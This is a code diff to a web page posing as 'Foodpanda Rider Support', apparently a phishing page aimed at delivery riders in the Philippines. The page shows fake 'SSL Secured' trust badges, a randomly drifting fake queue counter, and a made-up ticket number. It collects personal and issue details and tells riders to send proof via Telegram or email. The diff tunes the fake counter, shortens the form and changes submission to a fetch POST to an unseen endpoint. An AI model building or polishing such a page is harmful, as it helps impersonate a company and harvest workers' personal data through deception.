@@ -27,15 +27,8 @@ body{
   border:2px solid var(--pink);position:relative;overflow:hidden;
 }
 .top-bar{position:absolute;top:0;left:0;width:100%;height:6px;background:var(--pink);}
-
-.panda-section{text-align:center;margin-bottom:16px;}
-.main-panda{font-size:70px;display:block;margin-bottom:8px;animation:bounce 2s infinite;}
+.main-panda{font-size:70px;text-align:center;display:block;margin-top:10px;animation:bounce 2s infinite;}
 @keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-6px);}}
-
-.panda-label{
-  color:var(--pink);font-size:15px;font-weight:900;
-  letter-spacing:0.5px;margin:0;
-}
 
 .trust-row{display:flex;justify-content:center;gap:10px;margin:10px 0 14px;flex-wrap:wrap;}
 .trust-badge{
@@ -249,11 +242,7 @@ textarea{resize:none;}
 
 <div class="container">
   <div class="top-bar"></div>
-  
-  <div class="panda-section">
-    <span class="main-panda">🐼</span>
-    <h2 class="panda-label">Foodpanda Rider Support</h2>
-  </div>
+  <span class="main-panda">🐼</span>
 
   <div class="trust-row">
     <div class="trust-badge">🔒 SSL Secured</div>
@@ -262,7 +251,7 @@ textarea{resize:none;}
   </div>
 
   <div class="status">🟢 Support Team Online — Avg. reply: 3-5 mins</div>
-  <div class="live-queue">🚨 <span id="queueCount">847</span> riders currently waiting &nbsp;·&nbsp; ⏱ Response: 3-5 mins</div>
+  <div class="live-queue">🚨 <span id="queueCount">92</span> riders currently waiting &nbsp;·&nbsp; ⏱ Response: 3-5 mins</div>
 
   <div class="vehicle-row">
     <div class="vehicle-box"><div class="vehicle-icon">🛵</div><div class="vehicle-label">RIDER</div></div>
@@ -283,13 +272,10 @@ textarea{resize:none;}
     <div class="step-dot active" id="sd1">1</div>
     <div class="step-line" id="sl1"></div>
     <div class="step-dot" id="sd2">2</div>
-    <div class="step-line" id="sl2"></div>
-    <div class="step-dot" id="sd3">3</div>
   </div>
   <div class="step-labels">
     <div class="step-label active" id="sl-1">Personal Info</div>
-    <div class="step-label" id="sl-2">Issue Details</div>
-    <div class="step-label" id="sl-3">Review & Submit</div>
+    <div class="step-label" id="sl-2">Issue Details & Submit</div>
   </div>
 
   <!-- SUCCESS SCREEN -->
@@ -366,14 +352,6 @@ textarea{resize:none;}
       </select>
       <label>Did support already contact you?</label>
       <select name="support_contact"><option>No</option><option>Yes</option></select>
-      <div class="btn-row">
-        <button type="button" class="btn-back" onclick="goStep(1)">← Back</button>
-        <button type="button" class="btn-next" onclick="goStep(3)">Next: Review →</button>
-      </div>
-    </div>
-
-    <!-- STEP 3 -->
-    <div class="form-step" id="step3">
       <label>Ticket Concern / Details <span class="required">*</span></label>
       <textarea name="concern" rows="5" placeholder="Ilarawan nang malinaw ang iyong concern o hiling na tulong..." required></textarea>
       <div class="notice">📌 Attach proof later via Telegram/Email after support verification.</div>
@@ -382,7 +360,7 @@ textarea{resize:none;}
         <label for="privacyCheck">I agree to the <a href="#">Privacy Policy</a> and consent to processing of my personal data under RA 10173.</label>
       </div>
       <div class="btn-row">
-        <button type="button" class="btn-back" onclick="goStep(2)">← Back</button>
+        <button type="button" class="btn-back" onclick="goStep(1)">← Back</button>
         <button type="submit" class="btn-submit" id="submitBtn">🐼 Submit Official Ticket</button>
       </div>
     </div>
@@ -430,21 +408,20 @@ textarea{resize:none;}
 const ticketNo = 'PP-' + Math.floor(Math.random()*900000+100000);
 document.getElementById('ticketNumber').innerHTML = ticketNo;
 
-// QUEUE COUNTER — slowly increments/decrements randomly (much bigger numbers now)
-let qCount = 847;
+// QUEUE COUNTER — slowly increments/decrements randomly
+let qCount = 92;
 setInterval(()=>{
-  qCount += Math.random()>0.5 ? Math.floor(Math.random()*8)+2 : -(Math.floor(Math.random()*8)+2);
-  if(qCount<650) qCount=650;
-  if(qCount>1200) qCount=1200;
+  qCount += Math.random()>0.5 ? 1 : -1;
+  if(qCount<80) qCount=80;
+  if(qCount>110) qCount=110;
   document.getElementById('queueCount').textContent = qCount;
-}, 3500);
+}, 4000);
 
 // STEP NAVIGATION
 function goStep(n){
   document.querySelectorAll('.form-step').forEach(s=>s.classList.remove('active'));
   document.getElementById('step'+n).classList.add('active');
-  // update dots
-  for(let i=1;i<=3;i++){
+  for(let i=1;i<=2;i++){
     const dot=document.getElementById('sd'+i);
     const lbl=document.getElementById('sl-'+i);
     dot.classList.remove('active','done');
@@ -453,34 +430,43 @@ function goStep(n){
     else if(i===n){dot.classList.add('active');dot.innerHTML=i;lbl.classList.add('active');}
     else{dot.innerHTML=i;}
   }
-  for(let i=1;i<=2;i++){
-    const line=document.getElementById('sl'+i);
-    line.classList.toggle('done', i<n);
-  }
+  const line=document.getElementById('sl1');
+  line.classList.toggle('done', n>1);
   window.scrollTo({top:0,behavior:'smooth'});
 }
 
 // FORM SUBMIT
-document.getElementById('supportForm').addEventListener('submit',function(e){
+document.getElementById('supportForm').addEventListener('submit',async function(e){
   e.preventDefault();
   const btn=document.getElementById('submitBtn');
   btn.innerHTML='⏳ Processing...';
   btn.disabled=true;
-  const iframe=document.createElement('iframe');
-  iframe.name='hidden_frame';
-  iframe.style.display='none';
-  document.body.appendChild(iframe);
-  this.target='hidden_frame';
-  this.submit();
-  setTimeout(()=>{
-    document.getElementById('supportForm').style.display='none';
-    document.querySelector('.step-indicator').style.display='none';
-    document.querySelector('.step-labels').style.display='none';
-    document.getElementById('confirmedTicket').textContent=ticketNo;
-    document.getElementById('successScreen').classList.add('show');
+  const formData=new FormData(this);
+  formData.append('ticket_number', ticketNo);
+  try{
+    const res=await fetch(this.action,{
+      method:'POST',
+      body:formData,
+      headers:{Accept:'application/json'}
+    });
+    if(res.ok){
+      document.getElementById('supportForm').style.display='none';
+      document.querySelector('.step-indicator').style.display='none';
+      document.querySelector('.step-labels').style.display='none';
+      document.getElementById('confirmedTicket').textContent=ticketNo;
+      document.getElementById('successScreen').classList.add('show');
+    } else {
+      const data=await res.json().catch(()=>({}));
+      const msg=(data&&data.errors)?data.errors.map(x=>x.message).join(', '):'Please try again.';
+      alert('❌ Submission failed: '+msg);
+      btn.innerHTML='🐼 Submit Official Ticket';
+      btn.disabled=false;
+    }
+  }catch(err){
+    alert('❌ Network error. Please check your connection and try again.');
     btn.innerHTML='🐼 Submit Official Ticket';
     btn.disabled=false;
-  },2000);
+  }
 });
 
 // BOT NUDGE after 10s
